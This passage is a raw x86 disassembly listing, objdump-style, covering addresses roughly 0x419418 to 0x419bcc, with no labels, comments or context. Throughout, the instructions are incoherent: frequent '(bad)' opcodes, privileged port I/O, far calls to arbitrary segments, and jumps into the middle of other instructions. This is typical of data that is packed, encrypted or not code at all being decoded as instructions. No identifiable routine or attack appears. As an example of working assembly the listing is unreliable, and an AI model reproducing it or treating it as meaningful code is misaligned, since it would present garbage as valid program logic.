  419418:	(bad)  
  419419:	fnstsw WORD PTR [ebp-0x4b]
  41941c:	mov    ecx,0xbd357f66
  419421:	sub    edx,ebp
  419423:	jae    0x4193fe
  419425:	mov    dl,0xf3
  419427:	jnp    0x419468
  419429:	push   0x39
  41942b:	adc    al,0x3d
  41942d:	fsubr  QWORD PTR [ecx+0x6c060e0c]
  419433:	pop    edx
  419434:	jns    0x419405
  419436:	pop    ds
  419437:	mov    esi,0xc6335f7f
  41943c:	loope  0x419442
  41943e:	jne    0x419423
  419440:	das    
  419441:	mov    ebp,0xc454af36
  419446:	add    bl,ch
  419448:	(bad)  
  419449:	stos   BYTE PTR es:[edi],al
  41944a:	add    eax,0xe059ab68
  41944f:	mov    ds:0xc0c6bbca,eax
  419454:	jge    0x4194a8
  419456:	inc    ebx
  419457:	sbb    BYTE PTR [edx+0x23],ah
  41945a:	cmp    dh,BYTE PTR [esi+0x7c]
  41945d:	(bad)  
  41945e:	mov    bh,0x81
  419460:	call   eax
  419462:	cmp    DWORD PTR [eax+0x70afde2d],ebp
  419468:	clc    
  419469:	and    ah,BYTE PTR [eax-0x3]
  41946c:	in     eax,dx
  41946d:	or     BYTE PTR [edx-0x7],ch
  419470:	in     al,dx
  419471:	popf   
  419472:	adc    dl,BYTE PTR [eax]
  419474:	cmc    
  419475:	jo     0x4194cf
  419477:	aad    0x27
  419479:	mov    ebx,0xf64fe465
  41947e:	ror    BYTE PTR [edx+edx*1+0x7b],1
  419482:	into   
  419483:	mov    eax,ds:0xe05e6e0c
  419488:	or     al,0x75
  41948a:	sub    eax,DWORD PTR [eax+0x3cda708]
  419490:	xchg   esp,eax
  419491:	sar    BYTE PTR [edi+0x2b],cl
  419494:	push   esi
  419495:	push   0x37e35afa
  41949a:	mov    ss,WORD PTR [esi+0x64]
  41949d:	jbe    0x41948b
  41949f:	push   ecx
  4194a0:	outs   dx,DWORD PTR ds:[esi]
  4194a1:	xor    DWORD PTR [ebp+0x77],eax
  4194a4:	pushf  
  4194a5:	pop    esp
  4194a6:	jno    0x41943b
  4194a8:	push   ecx
  4194a9:	add    cl,dh
  4194ab:	mov    DWORD PTR [edx+0x9],ecx
  4194ae:	mov    DWORD PTR [esi-0x158219db],esi
  4194b4:	outs   dx,BYTE PTR ds:[esi]
  4194b5:	inc    ebp
  4194b6:	sub    bl,BYTE PTR [ecx-0x63]
  4194b9:	dec    ebp
  4194ba:	add    BYTE PTR [ebx],ah
  4194bc:	dec    edx
  4194bd:	push   edi
  4194be:	sar    dl,0x14
  4194c1:	(bad)  
  4194c2:	stc    
  4194c3:	sbb    eax,0xa71b78c1
  4194c8:	outs   dx,BYTE PTR ds:[esi]
  4194c9:	in     al,dx
  4194ca:	mov    eax,0x418a2138
  4194cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194d0:	jno    0x41945c
  4194d2:	adc    edx,esp
  4194d4:	icebp  
  4194d5:	(bad)  
  4194d6:	in     eax,dx
  4194d7:	inc    ecx
  4194d8:	(bad)  
  4194d9:	pushf  
  4194da:	sbb    ch,BYTE PTR [eax]
  4194dc:	jbe    0x4194bf
  4194de:	jmp    0x4194ac
  4194e0:	xchg   ebx,eax
  4194e1:	add    al,0x96
  4194e3:	cld    
  4194e4:	mov    dl,0xbd
  4194e6:	mov    ch,cl
  4194e8:	loopne 0x41950b
  4194ea:	push   ecx
  4194eb:	mov    WORD PTR [ecx],es
  4194ed:	shl    al,cl
  4194ef:	xor    ch,bl
  4194f1:	add    DWORD PTR [eax-0x6c],esp
  4194f4:	dec    ecx
  4194f5:	mov    bl,0x2c
  4194f7:	das    
  4194f8:	stc    
  4194f9:	and    ecx,DWORD PTR [esi-0x1b]
  4194fc:	push   0x4a
  4194fe:	dec    ecx
  4194ff:	gs out dx,al
  419501:	mov    ah,0x99
  419503:	mov    esi,0xaf2d55d
  419508:	mov    ebx,0xbb399d
  41950d:	cmp    eax,0x8a9d2a42
  419512:	cmp    BYTE PTR [esi+0x1a],dh
  419515:	mov    ecx,0x23adc4bd
  41951a:	into   
  41951b:	mov    gs,WORD PTR es:[ebx+0xe3ba5b0]
  419522:	xchg   ebp,eax
  419523:	call   FWORD PTR [ebx+0x1a0874de]
  419529:	dec    ecx
  41952a:	in     eax,dx
  41952b:	mov    dh,0x46
  41952d:	mov    ebx,0x63cb858a
  419532:	mov    ch,0x2a
  419534:	mov    eax,ds:0x47f9ec64
  419539:	mov    eax,ds:0x79a84288
  41953e:	sbb    BYTE PTR [esi+0x4534a05e],0x6f
  419545:	jbe    0x41957e
  419547:	and    cl,BYTE PTR ds:0x488fd3d6
  41954d:	and    al,0x8d
  41954f:	mov    edi,gs
  419551:	loop   0x419556
  419553:	ins    BYTE PTR es:[edi],dx
  419554:	push   ecx
  419555:	loopne 0x4195c5
  419557:	stos   DWORD PTR es:[edi],eax
  419558:	popf   
  419559:	push   edi
  41955a:	dec    edx
  41955b:	mov    bh,0x1
  41955d:	sahf   
  41955e:	adc    DWORD PTR [esp+edx*8+0x6c76d13],esi
  419565:	and    dh,ch
  419567:	call   0x436b:0x7ac75c43
  41956e:	adc    DWORD PTR [ecx+0x7d],esp
  419571:	fcomi  st,st(6)
  419573:	and    esi,DWORD PTR [esi-0x299cca86]
  419579:	pusha  
  41957a:	(bad)  
  41957b:	sbb    esp,DWORD PTR [esi+0x6148eef4]
  419581:	cmp    DWORD PTR [ecx+0x7a650e9a],esi
  419587:	mov    dl,ah
  419589:	jne    0x419514
  41958b:	rol    DWORD PTR [ecx],cl
  41958d:	inc    esi
  41958e:	and    ebp,DWORD PTR [ebp-0x7c]
  419591:	std    
  419592:	push   ds
  419593:	adc    dh,BYTE PTR [edi-0xd]
  419596:	xor    al,BYTE PTR [edx-0x603b1c33]
  41959c:	(bad)  
  41959e:	cmp    eax,0x785c76ed
  4195a3:	push   cs
  4195a4:	retf   
  4195a5:	data16 jae 0x4195dd
  4195a8:	mov    eax,0x54301bf8
  4195ad:	cmp    DWORD PTR [edx+0x2933465f],ebp
  4195b3:	dec    ebp
  4195b4:	pusha  
  4195b5:	dec    eax
  4195b6:	mov    cl,0x7c
  4195b8:	push   esp
  4195b9:	shl    ebx,cl
  4195bb:	(bad)  
  4195bc:	sar    DWORD PTR [edx-0x58b92800],cl
  4195c2:	pop    ecx
  4195c3:	js     0x419584
  4195c5:	mov    ds:0x96081f79,al
  4195ca:	bound  esi,QWORD PTR [edi-0x4]
  4195cd:	cmp    DWORD PTR [ebx+0x7c5fb5ef],0xe6159151
  4195d7:	jno    0x4195c6
  4195d9:	jmp    0xc2cf2e6
  4195de:	add    dl,BYTE PTR [esi+edi*2]
  4195e1:	adc    ah,cl
  4195e3:	or     BYTE PTR [edi],dl
  4195e5:	shl    edi,0xa7
  4195e8:	adc    al,0x1b
  4195ea:	dec    eax
  4195eb:	loope  0x41960b
  4195ed:	inc    edi
  4195ee:	rcr    bh,0xc1
  4195f1:	push   eax
  4195f2:	push   cs
  4195f3:	aaa    
  4195f4:	xchg   ebx,eax
  4195f5:	jmp    0x5fceb892
  4195fa:	jns    0x4195fe
  4195fc:	ss retf 
  4195fe:	mov    dl,BYTE PTR [edi]
  419600:	or     eax,0xeccc06d4
  419605:	scas   al,BYTE PTR es:[edi]
  419606:	out    0x8d,eax
  419608:	fwait
  419609:	cwde   
  41960a:	mov    eax,ds:0xd916f643
  41960f:	sbb    DWORD PTR [ecx+eax*2],edi
  419612:	loopne 0x419623
  419614:	rcl    BYTE PTR [edx-0x52747ef1],0x63
  41961b:	rcl    BYTE PTR [ecx+0x1e308c7d],1
  419621:	pop    ds
  419622:	jl     0x419624
  419624:	mov    DWORD PTR [esi],esp
  419626:	mov    eax,0x7eb86c53
  41962b:	xor    BYTE PTR [edx+0x64],dh
  41962e:	lods   eax,DWORD PTR ds:[esi]
  41962f:	(bad)  
  419630:	xor    ebx,eax
  419632:	jne    0x4196ac
  419634:	mov    ch,0xa3
  419636:	fcmove st,st(7)
  419638:	sub    al,0xd2
  41963a:	jnp    0x4195f4
  41963c:	pop    esi
  41963d:	mov    DWORD PTR [ecx],edi
  41963f:	jmp    0xa34156a
  419644:	dec    esi
  419645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419646:	push   ebp
  419647:	jl     0x419693
  419649:	outs   dx,DWORD PTR ds:[esi]
  41964a:	xchg   ebp,eax
  41964b:	xor    edx,esi
  41964d:	jg     0x4196be
  41964f:	in     eax,0xb7
  419651:	ins    DWORD PTR es:[edi],dx
  419652:	pop    ss
  419653:	xchg   edx,eax
  419654:	hlt    
  419655:	rcl    ebx,0x72
  419658:	ja     0x4196a8
  41965a:	and    al,BYTE PTR [ebp-0x13]
  41965d:	into   
  41965e:	lea    eax,[eax]
  419660:	inc    esi
  419661:	lods   al,BYTE PTR ds:[esi]
  419662:	adc    DWORD PTR [edx+eiz*8-0x20],0x48
  419667:	jne    0x4196a5
  419669:	push   0x38ba87d0
  41966e:	xor    BYTE PTR [eax],dl
  419670:	mov    al,0xce
  419672:	out    0xb0,al
  419674:	xor    DWORD PTR [ebx+0x5136f802],ebp
  41967a:	jle    0x4196cb
  41967c:	or     eax,0xd38930b4
  419681:	inc    edx
  419682:	sub    al,0x76
  419684:	scas   eax,DWORD PTR es:[edi]
  419685:	loop   0x4196b7
  419687:	call   0xe01c:0xbf0583a6
  41968e:	jp     0x419633
  419690:	xlat   BYTE PTR ds:[ebx]
  419691:	cli    
  419692:	mov    ds:0x5b82ad00,al
  419697:	fwait
  419698:	outs   dx,DWORD PTR ds:[esi]
  419699:	dec    ebp
  41969a:	or     al,0x9d
  41969c:	cmp    ebx,0x52d03de5
  4196a2:	test   BYTE PTR [ecx+0x31659ccf],0xf7
  4196a9:	pop    edx
  4196aa:	gs (bad) 
  4196ac:	fistp  QWORD PTR [ecx+edi*1+0x4468ed46]
  4196b3:	push   ds
  4196b4:	mov    WORD PTR [edx-0x5d245c41],ds
  4196ba:	out    0x6e,al
  4196bc:	mov    al,0xa6
  4196be:	add    cl,ah
  4196c0:	test   al,0xb4
  4196c2:	xchg   ebp,eax
  4196c3:	ja     0x41968d
  4196c5:	lock inc ebp
  4196c7:	mov    ah,0x5a
  4196c9:	adc    al,BYTE PTR [eax+0x46]
  4196cc:	xchg   esp,eax
  4196cd:	pop    esp
  4196ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196cf:	cli    
  4196d0:	push   esp
  4196d1:	int3   
  4196d2:	outs   dx,BYTE PTR ds:[esi]
  4196d3:	lahf   
  4196d4:	out    dx,eax
  4196d5:	pushf  
  4196d6:	fnstsw WORD PTR [ecx+edi*2-0x5]
  4196da:	cmp    al,0xbb
  4196dc:	push   0xfc69a09d
  4196e1:	cmp    al,0x2d
  4196e3:	iret   
  4196e4:	repz and cl,BYTE PTR [ecx]
  4196e7:	and    eax,0x4fb84802
  4196ec:	lods   eax,DWORD PTR ds:[esi]
  4196ed:	or     dh,BYTE PTR [ebx-0x67800914]
  4196f3:	stos   BYTE PTR es:[edi],al
  4196f4:	fidivr DWORD PTR [ebx-0x4042317d]
  4196fa:	mov    ah,BYTE PTR [edx]
  4196fc:	jae    0x41974e
  4196fe:	jp     0x419765
  419700:	sbb    BYTE PTR [ebx],bh
  419702:	mov    ebx,0xdfc4c5dc
  419707:	nop    DWORD PTR [edi+0x5392a77a]
  41970e:	std    
  41970f:	(bad)  
  419710:	jne    0x4196cc
  419712:	pop    esp
  419713:	mov    esp,0xfa9913e2
  419718:	xchg   ebx,eax
  419719:	add    al,0x45
  41971b:	in     al,dx
  41971c:	clc    
  41971d:	xchg   edi,eax
  41971e:	sub    ecx,esp
  419720:	sub    bh,dh
  419722:	sub    eax,0x7dbb5465
  419727:	ret    0x37b7
  41972a:	ds xchg edx,eax
  41972c:	bound  esp,QWORD PTR [edi]
  41972e:	mov    dl,0x48
  419730:	sbb    edi,DWORD PTR [edx+esi*2]
  419733:	retf   
  419734:	fwait
  419735:	pushf  
  419736:	xchg   BYTE PTR [edi-0x7d],dh
  419739:	scas   eax,DWORD PTR es:[edi]
  41973a:	sub    ch,BYTE PTR [esi-0x6e0792f3]
  419740:	sub    DWORD PTR [ebx+0x345d8e7c],eax
  419746:	mov    eax,ds:0xfe8cf596
  41974b:	inc    edi
  41974c:	popf   
  41974d:	call   0x9fbc1552
  419752:	xchg   esp,eax
  419753:	sub    eax,0x66526f87
  419758:	aaa    
  419759:	mov    es,edx
  41975b:	cdq    
  41975c:	mov    ds:0xfc552b17,al
  419761:	adc    ebp,DWORD PTR [ecx+edi*2+0x6c]
  419765:	pushf  
  419766:	cmc    
  419767:	jge    0x419793
  419769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41976a:	das    
  41976b:	pop    ss
  41976c:	or     eax,0x4392a26c
  419771:	das    
  419772:	pop    ds
  419773:	mov    cl,0x3a
  419775:	pop    edi
  419776:	cwde   
  419777:	jbe    0x41970b
  419779:	repnz pushf 
  41977b:	sbb    ebx,edx
  41977d:	cld    
  41977e:	out    0x82,al
  419780:	nop
  419781:	xchg   esi,eax
  419782:	les    esi,FWORD PTR [edi+0x2552e3ac]
  419788:	shl    ch,0xa
  41978b:	sub    BYTE PTR [edx-0x3],dh
  41978e:	mov    BYTE PTR [eax],dh
  419790:	push   edx
  419791:	jmp    0xe441:0xf134626e
  419798:	push   ss
  419799:	fistp  WORD PTR [edi]
  41979b:	and    al,0x25
  41979d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41979e:	adc    BYTE PTR [edx+0xa],bh
  4197a1:	mov    edx,0xd73aee56
  4197a6:	dec    edx
  4197a7:	test   eax,0x3ae3bac
  4197ac:	cdq    
  4197ad:	mov    ?,WORD PTR ds:0x1934aadf
  4197b3:	xchg   ecx,eax
  4197b4:	or     eax,0x8fca62f5
  4197b9:	sub    al,0xc
  4197bb:	scas   al,BYTE PTR es:[edi]
  4197bc:	inc    ebp
  4197bd:	sbb    ebx,DWORD PTR [eax+ebp*2-0x6157860e]
  4197c4:	imul   ebx,DWORD PTR [esi],0x74
  4197c7:	inc    edx
  4197c8:	hlt    
  4197c9:	mov    dh,0x71
  4197cb:	int3   
  4197cc:	add    eax,0x1022f6f3
  4197d1:	mov    cl,0xdd
  4197d3:	cmc    
  4197d4:	adc    al,0x50
  4197d6:	mov    esi,0xc649ac31
  4197db:	dec    edi
  4197dc:	pop    edx
  4197dd:	and    al,0xb5
  4197df:	lahf   
  4197e0:	sub    ch,BYTE PTR [ebx+0x61]
  4197e3:	ror    ch,cl
  4197e5:	mov    WORD PTR [ebp-0x9],cs
  4197e8:	push   cx
  4197ea:	cmp    al,0xdf
  4197ec:	add    esp,0xea9256cd
  4197f2:	xchg   ecx,eax
  4197f3:	call   0xb62074ec
  4197f8:	mov    al,0x28
  4197fa:	out    dx,al
  4197fb:	sub    bh,ch
  4197fd:	push   cs
  4197fe:	ret    
  4197ff:	or     ch,BYTE PTR [edi+0x36e796a9]
  419805:	call   0xe24364a4
  41980a:	sub    BYTE PTR [ebp-0x555f2344],dl
  419810:	fmul   DWORD PTR [ecx+0x7bb150d9]
  419816:	idiv   BYTE PTR [edi+0x7a]
  419819:	fld    QWORD PTR [ebx-0x2]
  41981c:	inc    edx
  41981d:	sub    eax,0x6f5179f8
  419822:	push   ebx
  419823:	sbb    al,0x4
  419825:	cmp    al,bh
  419827:	pushf  
  419828:	fisttp DWORD PTR [edi+0x21778e8b]
  41982e:	jno    0x4197ca
  419830:	mov    cl,0xcd
  419832:	test   DWORD PTR [esi],ebx
  419834:	clc    
  419835:	shl    DWORD PTR [edx+eiz*1-0x46aadbc2],cl
  41983c:	es mov edx,ecx
  41983f:	data16 sti 
  419841:	ficomp WORD PTR [edi]
  419843:	mov    eax,ds:0x39739fdc
  419848:	jmp    0x4197f3
  41984a:	xchg   ebp,eax
  41984b:	and    BYTE PTR [eax-0x5e],cl
  41984e:	sub    al,0x7
  419850:	into   
  419851:	jecxz  0x419897
  419853:	je     0x41987a
  419855:	mov    fs,ebp
  419857:	sbb    ecx,DWORD PTR [eax+0xe]
  41985a:	(bad)  
  41985b:	dec    esi
  41985c:	(bad)  
  41985e:	je     0x4198bb
  419860:	jle    0x4198c5
  419862:	nop
  419863:	jg     0x419842
  419865:	cli    
  419866:	fcmovu st,st(4)
  419868:	mov    esi,ss
  41986a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41986b:	jae    0x419807
  41986d:	sbb    edi,DWORD PTR [esi]
  41986f:	sub    ah,BYTE PTR [esi-0x573f536b]
  419875:	push   esi
  419876:	sbb    edx,edx
  419878:	adc    eax,0xaa859124
  41987d:	outs   dx,DWORD PTR ds:[esi]
  41987e:	ror    BYTE PTR [edx-0x3f],0xa9
  419882:	mov    eax,0xc742cbc8
  419887:	bound  esp,QWORD PTR [edx-0x2988be79]
  41988d:	mov    al,0x3e
  41988f:	pop    edx
  419890:	push   esi
  419891:	mov    DWORD PTR [edx],edi
  419893:	push   ss
  419894:	sbb    eax,0xbb794e5c
  419899:	inc    edx
  41989a:	xor    ebp,edi
  41989c:	mov    ecx,0xf4930c27
  4198a1:	sbb    esi,ebx
  4198a3:	bound  esp,QWORD PTR gs:[ebx]
  4198a6:	dec    esp
  4198a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198a8:	es dec eax
  4198aa:	int    0x28
  4198ac:	mov    ebp,0x6dfa426b
  4198b1:	lods   al,BYTE PTR ds:[esi]
  4198b2:	inc    ecx
  4198b3:	mov    al,0xa5
  4198b5:	pop    edx
  4198b6:	nop
  4198b7:	adc    al,0x9a
  4198b9:	test   al,0xe2
  4198bb:	sub    DWORD PTR [ecx+0x4c],esp
  4198be:	add    eax,DWORD PTR [eax-0x28f028e7]
  4198c4:	jbe    0x419879
  4198c6:	and    al,0x4f
  4198c8:	shl    DWORD PTR [edi],1
  4198ca:	shl    BYTE PTR [esi+0x58b3057c],cl
  4198d0:	mov    edi,0xcaad0bb5
  4198d5:	mov    dh,BYTE PTR [ebp+0x52]
  4198d8:	in     al,dx
  4198d9:	or     BYTE PTR [esi+0x3a],ch
  4198dc:	mov    edx,0x240c631d
  4198e1:	cmp    ecx,edi
  4198e3:	xor    ebp,DWORD PTR [ebx+esi*2-0x25]
  4198e7:	or     bl,BYTE PTR [ebp+0x29]
  4198ea:	out    dx,al
  4198eb:	(bad)  
  4198ec:	and    ebx,DWORD PTR [eax-0x4d]
  4198ef:	sar    BYTE PTR [edi-0x50],0xe8
  4198f3:	xchg   ebx,eax
  4198f4:	mov    ch,0x48
  4198f6:	pushf  
  4198f7:	enter  0x3a4c,0x6a
  4198fb:	popa   
  4198fc:	retf   
  4198fd:	push   ecx
  4198fe:	sbb    DWORD PTR [esp+eax*1],ecx
  419901:	mov    esp,0x48365c00
  419906:	sub    edx,ebx
  419908:	jge    0x419988
  41990a:	push   eax
  41990b:	cmp    ebp,DWORD PTR [eax+0x40]
  41990e:	push   0x30
  419910:	add    DWORD PTR [di+0x661f],ebx
  419915:	cdq    
  419916:	lds    edi,FWORD PTR [edi+0x21]
  419919:	in     al,0x62
  41991b:	mov    esp,0x69016f75
  419920:	(bad)  
  419921:	ficom  WORD PTR [ecx-0x72]
  419924:	int    0xd4
  419926:	mov    al,0xbd
  419928:	and    ecx,ebx
  41992a:	mov    ebp,0xc4e3b3ff
  41992f:	rcl    DWORD PTR [esi-0x50],cl
  419932:	imul   ecx,eax,0x1a267f95
  419938:	(bad)  
  41993a:	push   eax
  41993b:	das    
  41993c:	mov    BYTE PTR [ebx],dl
  41993e:	mov    bl,0xf
  419940:	icebp  
  419941:	push   0xffffffed
  419943:	jge    0x4198ce
  419945:	mov    ds:0x425bd20c,al
  41994a:	or     BYTE PTR [ebx+0x7a6c1e53],ah
  419950:	pushf  
  419951:	pop    eax
  419952:	cmp    DWORD PTR [ebx+0x7351f608],edi
  419958:	inc    esi
  419959:	push   ss
  41995a:	sti    
  41995b:	hlt    
  41995c:	add    eax,DWORD PTR [esi+0x7e]
  41995f:	mov    bl,0x97
  419962:	mov    ds:0xefc3ed5c,eax
  419967:	inc    edi
  419968:	in     al,0x89
  41996a:	stos   DWORD PTR es:[edi],eax
  41996b:	push   esi
  41996c:	xchg   DWORD PTR [esi-0x58],eax
  41996f:	outs   dx,BYTE PTR ds:[esi]
  419970:	std    
  419971:	cli    
  419972:	push   0xffffffdd
  419974:	or     bh,BYTE PTR [ecx]
  419976:	rol    BYTE PTR [edx-0x1c],0xab
  41997a:	aaa    
  41997b:	jmp    0x1819c54c
  419980:	pop    edi
  419981:	and    eax,esp
  419983:	cwde   
  419984:	and    DWORD PTR [esi],esi
  419986:	sbb    al,0xea
  419988:	pop    ss
  419989:	mov    gs,WORD PTR [edi]
  41998b:	jno    0x419927
  41998d:	arpl   WORD PTR ds:0x22613924,bp
  419993:	add    esi,DWORD PTR [eax-0x4e]
  419996:	push   es
  419997:	add    ecx,eax
  419999:	push   ds
  41999a:	pop    ss
  41999b:	add    dl,BYTE PTR [ecx+0x69]
  41999e:	sub    al,BYTE PTR [ebx-0x45]
  4199a1:	daa    
  4199a2:	repz inc ebx
  4199a4:	mov    al,0xc4
  4199a6:	pop    eax
  4199a7:	add    ebx,DWORD PTR [ebp-0x5a]
  4199aa:	(bad)  
  4199ab:	adc    edx,DWORD PTR [eax]
  4199ad:	adc    ah,BYTE PTR [eax+0x3e]
  4199b0:	aaa    
  4199b1:	into   
  4199b2:	mov    bh,0xfd
  4199b4:	xchg   BYTE PTR [ebx+0x1986658d],al
  4199ba:	hlt    
  4199bb:	dec    esi
  4199bc:	lds    eax,FWORD PTR [ebx-0x72]
  4199bf:	jmp    0x61fb1fe1
  4199c4:	in     al,dx
  4199c5:	jne    0x419a0f
  4199c7:	daa    
  4199c8:	test   eax,0x60e04abb
  4199cd:	mov    ds:0x77c9aee3,eax
  4199d2:	jo     0x4199f8
  4199d4:	sbb    al,0xab
  4199d6:	and    edi,esi
  4199d8:	sbb    eax,0x7eec898
  4199dd:	mov    ch,0x98
  4199df:	mov    ch,BYTE PTR [edi-0x5803d1e5]
  4199e5:	push   es
  4199e6:	xor    DWORD PTR [ebx+0x79fc9a00],eax
  4199ec:	jp     0x4199ee
  4199ee:	sub    ah,BYTE PTR [edx]
  4199f0:	sub    al,0x38
  4199f2:	push   esi
  4199f3:	push   0xf34ab0ed
  4199f8:	pop    esi
  4199f9:	push   cs
  4199fa:	xor    edx,ecx
  4199fc:	test   eax,0xdbc360ed
  419a01:	sbb    DWORD PTR [eax],edx
  419a03:	or     bh,BYTE PTR ds:0x1063e558
  419a09:	test   eax,0x92bfa5b0
  419a0e:	ret    0xa089
  419a11:	mov    edi,0x7d85cc18
  419a16:	xchg   ecx,eax
  419a17:	loope  0x4199f7
  419a19:	adc    edi,eax
  419a1b:	or     al,0x2
  419a1d:	cld    
  419a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a1f:	and    ebx,edx
  419a21:	xchg   BYTE PTR [ebp+ebp*2+0x7e71dcd7],bh
  419a28:	dec    esi
  419a29:	cli    
  419a2a:	(bad)
  419a2d:	inc    edx
  419a2e:	mov    al,ds:0x2b995a4c
  419a33:	xchg   ebp,eax
  419a34:	out    dx,eax
  419a35:	mov    bl,0xde
  419a37:	pop    es
  419a38:	jo     0x419a2e
  419a3a:	mov    al,dh
  419a3c:	jno    0x419a22
  419a3e:	imul   BYTE PTR [edx+0x57]
  419a41:	inc    esi
  419a42:	jbe    0x419abc
  419a44:	dec    ebp
  419a45:	scas   eax,DWORD PTR es:[edi]
  419a46:	je     0x4199d9
  419a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a49:	ficomp DWORD PTR [edx-0x7ba4f8f]
  419a4f:	shr    DWORD PTR [esi+esi*1+0x38],cl
  419a53:	adc    esi,DWORD PTR [ebx-0x3142c20a]
  419a59:	and    dh,ch
  419a5b:	adc    bh,BYTE PTR [ecx]
  419a5d:	xchg   edi,eax
  419a5e:	call   0xa7ea0e75
  419a63:	xchg   edx,eax
  419a64:	out    0x9e,eax
  419a66:	pop    es
  419a67:	push   eax
  419a68:	adc    eax,0x34c47305
  419a6d:	cli    
  419a6e:	adc    DWORD PTR [ebp+0x5f3a47f7],ecx
  419a74:	or     DWORD PTR [edx+0x31b99513],eax
  419a7a:	jmp    0xe9ca24dd
  419a7f:	inc    ecx
  419a80:	enter  0xbf44,0x86
  419a84:	outs   dx,BYTE PTR ds:[esi]
  419a85:	jns    0x419a16
  419a87:	sub    al,0x42
  419a89:	fdivr  QWORD PTR [esi]
  419a8b:	cld    
  419a8c:	xchg   ebx,eax
  419a8d:	cli    
  419a8e:	or     ch,ch
  419a90:	(bad)  
  419a92:	adc    ah,BYTE PTR [ebx]
  419a94:	cmp    esi,DWORD PTR [edi]
  419a96:	ret    0x5fdd
  419a99:	scas   eax,DWORD PTR es:[edi]
  419a9a:	mov    ch,0x54
  419a9c:	sbb    eax,0x641cd2ce
  419aa1:	sar    BYTE PTR [eax-0x424a21cb],0xa
  419aa8:	cmp    ah,BYTE PTR [ebp*4-0x12b62f9c]
  419aaf:	mov    dh,ch
  419ab1:	std    
  419ab2:	add    cl,BYTE PTR [edx+0x5]
  419ab5:	xchg   esi,eax
  419ab6:	xchg   ebp,eax
  419ab7:	fnstsw WORD PTR [eax+ecx*8]
  419aba:	iret   
  419abb:	(bad)  
  419abc:	xchg   esp,eax
  419abd:	popa   
  419abe:	push   edi
  419abf:	jl     0x419a4d
  419ac1:	xor    al,0x7b
  419ac3:	int3   
  419ac4:	scas   al,BYTE PTR es:[edi]
  419ac5:	pop    sp
  419ac7:	call   0xc28d:0xeb6d8c11
  419ace:	es icebp 
  419ad0:	ins    BYTE PTR es:[edi],dx
  419ad1:	loop   0x419a92
  419ad3:	sub    ebx,DWORD PTR [eax+0x55b72c74]
  419ad9:	out    0x64,eax
  419adb:	pop    ebp
  419adc:	iret   
  419add:	fstp   TBYTE PTR [esi+0x77]
  419ae0:	ja     0x419aa6
  419ae2:	rol    BYTE PTR ds:0x163a7429,0xf9
  419ae9:	jmp    0xbea0:0xc176fb8a
  419af0:	dec    edi
  419af1:	out    dx,al
  419af2:	test   DWORD PTR cs:[eax+0x37],eax
  419af6:	and    esp,DWORD PTR [ecx-0x63]
  419af9:	mov    BYTE PTR [esi],dh
  419afb:	and    DWORD PTR [esi+0x4744af7d],0xdec6dcd5
  419b05:	add    eax,0x74d61bc7
  419b0a:	stos   DWORD PTR es:[edi],eax
  419b0b:	push   0x79
  419b0d:	out    0xd0,eax
  419b0f:	lods   eax,DWORD PTR ds:[esi]
  419b10:	scas   al,BYTE PTR es:[edi]
  419b11:	shr    BYTE PTR [ebx+ebx*8+0x55a864bc],0xe0
  419b19:	cmp    DWORD PTR [edi],edi
  419b1b:	dec    edi
  419b1c:	repz or dl,BYTE PTR [edi]
  419b1f:	push   ss
  419b20:	mov    WORD PTR [ebx-0x3e34f7ae],fs
  419b26:	(bad)  
  419b27:	rol    BYTE PTR ds:[ecx-0x23],1
  419b2b:	jl     0x419aad
  419b2d:	sar    DWORD PTR [edi+0x50],0x74
  419b31:	loope  0x419b9a
  419b33:	stos   DWORD PTR es:[edi],eax
  419b34:	in     eax,dx
  419b35:	retf   0x67a7
  419b38:	or     al,0xd2
  419b3a:	(bad)  
  419b3b:	mov    bh,0xb
  419b3d:	sbb    edi,DWORD PTR [ebx-0x602bfb72]
  419b43:	lods   al,BYTE PTR ds:[esi]
  419b44:	mov    ah,0x35
  419b46:	push   0x4a
  419b48:	es push esi
  419b4a:	push   edx
  419b4b:	or     bl,0x95
  419b4e:	cdq    
  419b4f:	dec    ebx
  419b50:	or     DWORD PTR [edx-0x6e],eax
  419b53:	outs   dx,BYTE PTR ds:[esi]
  419b54:	stos   DWORD PTR es:[edi],eax
  419b55:	mov    ebx,0xb9cd5cb9
  419b5a:	mov    ecx,0xe10d41e3
  419b5f:	les    esp,FWORD PTR [esi]
  419b61:	adc    bl,BYTE PTR [esi]
  419b63:	jg     0x419b44
  419b65:	inc    eax
  419b66:	mov    edx,esi
  419b68:	cld    
  419b69:	js     0x419b1f
  419b6b:	push   ebp
  419b6c:	dec    eax
  419b6d:	les    ebp,FWORD PTR [eax+eax*8+0x2aead992]
  419b74:	mov    ah,0x3e
  419b76:	cwde   
  419b77:	push   0x2170ac47
  419b7c:	mov    ah,0xb3
  419b7e:	dec    ebx
  419b7f:	aad    0x17
  419b81:	out    dx,eax
  419b82:	push   esp
  419b83:	adc    al,0x5c
  419b85:	mov    ecx,0x5a552ccc
  419b8a:	push   0x7ec25b70
  419b8f:	jne    0x419be2
  419b91:	jo     0x419b16
  419b93:	ins    DWORD PTR es:[edi],dx
  419b94:	and    ch,dh
  419b96:	push   ebp
  419b97:	inc    ecx
  419b98:	pop    esp
  419b99:	dec    DWORD PTR [esi+0x65]
  419b9c:	jecxz  0x419b4f
  419b9e:	pop    ebp
  419b9f:	aaa    
  419ba0:	loopne 0x419b51
  419ba2:	ret    
  419ba3:	hlt    
  419ba4:	aaa    
  419ba5:	pop    ds
  419ba6:	(bad)  
  419ba7:	fimul  DWORD PTR [esi+eax*2-0x5e489a5b]
  419bae:	(bad)  
  419baf:	cli    
  419bb0:	int    0x63
  419bb2:	cmp    dl,BYTE PTR [edx+eiz*8-0x57]
  419bb6:	fnstenv [edx-0x33]
  419bb9:	mov    ebx,0xc550557a
  419bbe:	xor    DWORD PTR [ebx-0x10],ebp
  419bc1:	lds    ebx,FWORD PTR [edi+0x7f]
  419bc4:	or     al,0x8e
  419bc6:	loope  0x419b52
  419bc8:	mov    cl,0x98
  419bca:	das    
  419bcb:	pop    ecx
  419bcc:	neg    ch
